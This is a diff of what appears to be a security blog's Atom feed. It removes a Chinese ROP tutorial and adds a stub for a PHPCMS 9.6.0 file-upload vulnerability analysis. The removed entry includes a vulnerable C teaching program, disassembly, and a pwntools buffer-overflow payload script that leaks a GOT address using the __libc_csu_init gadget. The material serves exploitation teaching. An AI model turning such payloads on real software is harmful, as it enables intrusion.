@@ -128,9 +128,9 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
@@ -221,163 +221,6 @@
       <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
     
       <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ROP学习：利用通用gadget</title>
-    <link href="http://yoursite.com/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/"/>
-    <id>http://yoursite.com/2017/08/09/ROP学习：利用通用gadget/</id>
-    <published>2017-08-09T11:19:20.000Z</published>
-    <updated>2017-08-09T14:13:09.265Z</updated>
-    
-    <content type="html"><![CDATA[<p>在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget ---binary bin --only &quot;pop|ret&quot;</div></pre></td></tr></table></figure></p>
-<p>来寻找gadget。但有时候找不到可用的gadget。</p>
-<p>但在x64的环境下，程序有调用libc.so的话，一般会有一个__libc_csu_init()函数。利用里面的gadget可以达到向函数进行传参的功能。这就是通用gadget。</p>
-<p>以蒸米师傅的<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.11b0b6ciOa8Kp&amp;articleid=473" target="_blank" rel="external">《一步一步学ROP之linux_x64篇》</a>为例研究一下。其源代码level5.c如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>用objdump查看，习惯intel语法了所以这里加了个 <code>-Mintel</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d -Mintel level5</div></pre></td></tr></table></figure></p>
-<p>其中__libc_csu_init函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005a0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp</div><div class="line">  4005a5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12</div><div class="line">  4005aa:	48 8d 2d 73 08 20 00 	lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b1:	4c 8d 25 6c 08 20 00 	lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13</div><div class="line">  4005bd:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14</div><div class="line">  4005c2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15</div><div class="line">  4005c7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx</div><div class="line">  4005cc:	48 83 ec 38          	sub    rsp,0x38</div><div class="line">  4005d0:	4c 29 e5             	sub    rbp,r12</div><div class="line">  4005d3:	41 89 fd             	mov    r13d,edi</div><div class="line">  4005d6:	49 89 f6             	mov    r14,rsi</div><div class="line">  4005d9:	48 c1 fd 03          	sar    rbp,0x3</div><div class="line">  4005dd:	49 89 d7             	mov    r15,rdx</div><div class="line">  4005e0:	e8 1b fe ff ff       	call   400400 &lt;_init&gt;</div><div class="line">  4005e5:	48 85 ed             	test   rbp,rbp</div><div class="line">  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;</div><div class="line">  4005ea:	31 db                	xor    ebx,ebx</div><div class="line">  4005ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]</div><div class="line">  4005f0:	4c 89 fa             	mov    rdx,r15</div><div class="line">  4005f3:	4c 89 f6             	mov    rsi,r14</div><div class="line">  4005f6:	44 89 ef             	mov    edi,r13d</div><div class="line">  4005f9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</div><div class="line">  4005fd:	48 83 c3 01          	add    rbx,0x1</div><div class="line">  400601:	48 39 eb             	cmp    rbx,rbp</div><div class="line">  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;</div><div class="line">  400606:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]</div><div class="line">  40060b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]</div><div class="line">  400610:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]</div><div class="line">  400615:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]</div><div class="line">  40061a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]</div><div class="line">  40061f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]</div><div class="line">  400624:	48 83 c4 38          	add    rsp,0x38</div><div class="line">  400628:	c3                   	ret    </div><div class="line">  400629:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]</div></pre></td></tr></table></figure></p>
-<p>蒸米师傅的第一个payload，是要利用write()输出在内存中的地址。脚本具体如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'level5'</span>)</div><div class="line">p = process(<span class="string">'./level5'</span>)</div><div class="line">log.info(proc.pidof(p)[<span class="number">0</span>])</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_write: "</span> + hex(got_write)</div><div class="line">got_read = elf.got[<span class="string">'read'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_read: "</span> + hex(got_read)</div><div class="line">main = <span class="number">0x400564</span></div><div class="line">payload1 =  <span class="string">"\x00"</span>*<span class="number">136</span></div><div class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></div><div class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></div><div class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">payload1 += p64(main)</div><div class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></div><div class="line">raw_input()</div><div class="line">p.send(payload1)</div><div class="line">raw_input()</div></pre></td></tr></table></figure></p>
-<p>其中log.info(proc.pidof(p)[0])用来输出process的pid，用于gdb的attach。第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的bain话，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/1.png?raw=true" alt=""></p>
-<p>如图所示，进程的PID号为4597.用gdb命令<code>gdb attach 4597</code>后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。</p>
-<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div></pre></td></tr></table></figure></p>
-<p>此时程序执行到read(STDIN_FILENO, buf, 512)，我们按<code>n</code>后，程序执行完read，将我们的payload读到了栈上。我们输入了136个<code>0</code>，然后是通用gadget的起始位置<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/2.png?raw=true" alt=""></p>
-<p>接下去继续输入<code>n</code>，当程序执行将到<code>0x400563 &lt;vulnerable_function+31&gt;:    ret</code>时，可以观察到此时栈顶为<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/3.png?raw=true" alt=""></p>
-<p>继续输入<code>n</code>，程序跳到通用gadget里，开始正式的rop。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/4.png?raw=true" alt=""></p>
-<p>根据我们的payload：p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0)，结合上图的stack分析，可知此时的栈中数据分布如下（小端序）：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">起点</th>
-<th style="text-align:center">+0</th>
-<th style="text-align:center">+1</th>
-<th style="text-align:center">+2</th>
-<th style="text-align:center">+3</th>
-<th style="text-align:center">+4</th>
-<th style="text-align:center">+5</th>
-<th style="text-align:center">+6</th>
-<th style="text-align:center">+7</th>
-<th style="text-align:center">对应数据</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">rsp</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x0</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+8</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x0</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+16</td>
-<td style="text-align:center">01</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x1</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+24</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">10</td>
-<td style="text-align:center">60</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x601000</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+32</td>
-<td style="text-align:center">01</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x1</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+40</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">10</td>
-<td style="text-align:center">60</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x601000</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+48</td>
-<td style="text-align:center">08</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x8</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+56</td>
-<td style="text-align:center">f0</td>
-<td style="text-align:center">05</td>
-<td style="text-align:center">40</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x4005f0</td>
-</tr>
-</tbody>
-</table>
-</div>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;
-    
-    </summary>
-    
-      <category term="Bin Security" scheme="http://yoursite.com/categories/Bin-Security/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="rop" scheme="http://yoursite.com/tags/rop/"/>
     
   </entry>
   
@@ -1237,6 +1080,33 @@
       <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHPCMS v9.6.0 任意文件上传漏洞分析</title>
+    <link href="http://yoursite.com/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://yoursite.com/2017/07/22/PHPCMS-v9-6-0-任意文件上传漏洞分析/</id>
+    <published>2017-07-22T13:02:14.000Z</published>
+    <updated>2017-07-28T08:19:33.659Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在服务器上准备好要上传的文件，比如shell.txt。其访问地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/shell.txt</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;p&gt;在服务器上准备好要上传的文件，比如shell.txt。其访问地址为：&lt;br&gt;&lt;figure class=&quot;highlight
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
